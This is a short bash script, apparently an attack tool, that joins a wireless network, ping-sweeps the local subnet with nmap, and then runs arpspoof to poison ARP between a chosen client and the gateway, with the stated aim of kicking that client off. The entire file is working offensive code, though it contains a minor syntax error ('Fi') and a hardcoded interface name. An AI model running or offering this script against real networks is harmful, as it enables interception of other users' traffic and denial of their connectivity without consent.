#!/bin/bash

if [ $# -lt 2 ]
then
   echo "Usage: ./arp-spoof.sh [MAC] [interface]"
   exit 0
Fi

#run airodump for 3 seconds to get SSID
timeout --foreground 3 airodump-ng --bssid $1 $2
#user enters the SSID
read -p "ESSID: " ESSID

#connect the wireless card to the access point
ifconfig $2 down
iwconfig $2 mode managed
ifconfig $2 up
iwconfig $2 essid $ESSID
dhclient $2

#get the /24 of the network
ip=`ip route | grep wlan0 | cut -d ' ' -f 1 | cut -d / -f 1 | cut -d . -f 1,2,3`

#ping sweep to find connected clients
nmap -e wlan0 -sP $ip.1-255

#user enters the gateway ip and the client ip
read -p "Gateway IP: " gatewayip
read -p "IP of client to kickoff: " clientip

#spoof ARP replies/response here
arpspoof -i $2 -t $clientip -r $gatewayip

